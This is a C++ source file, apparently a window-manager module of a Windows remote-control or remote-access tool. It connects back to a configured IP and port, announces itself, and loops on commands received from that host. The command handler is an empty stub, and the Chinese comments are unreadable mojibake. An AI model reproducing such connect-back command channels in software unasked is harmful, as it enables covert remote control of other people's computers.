#include "WindowManager.h"
#include "Command.h"
void windowManager(){
	struct sockaddr_in LocalAddr;
	LocalAddr.sin_family=AF_INET;
	LocalAddr.sin_port = htons(ConnectInfo::getConnectInfo()->port);
	LocalAddr.sin_addr.S_un.S_addr= inet_addr(ConnectInfo::getConnectInfo()->ipAddress);

	SOCKET windowManagerSocket = socket(AF_INET, SOCK_STREAM, 0);//���½���һ��ר�ŵ�socket�Ϳͻ��˽��н���
	if(connect(windowManagerSocket,(PSOCKADDR)&LocalAddr,sizeof(LocalAddr)) == SOCKET_ERROR)
	{
		closesocket(windowManagerSocket);
		return ;//connect error
	}

	MsgHead msgHead;
	char *chBuffer = new char[1536 * 1024]; //���ݽ����� 1.5MB

	//send socket type 
	msgHead.dwCmd = CMD_WINDOW_MANAGER_DLG_SHOW;
	msgHead.dwSize = 0;
	if(!SendMsg(windowManagerSocket, chBuffer, &msgHead))
	{
		if(chBuffer != NULL)
			delete []chBuffer;

		closesocket(windowManagerSocket);
		return ;//send socket type error
	}
	bool flag = true;
	while(flag)
	{
		//��������
		if(!RecvMsg(windowManagerSocket, chBuffer, &msgHead))
			break;

		//��������
		switch(msgHead.dwCmd)
		{
		case CMD_SHOW_WINDOW_LIST:
			{
			}
			break;
		default:
			{
				//::MessageBox(NULL,"����360�������⣡", "����360�������⣡", MB_OK);
			} 
			break;

		}
		memset(chBuffer, 0, 1536 * 1024);
	}
	if(chBuffer != NULL)
		delete[] chBuffer;
	closesocket(windowManagerSocket);
	return ;
}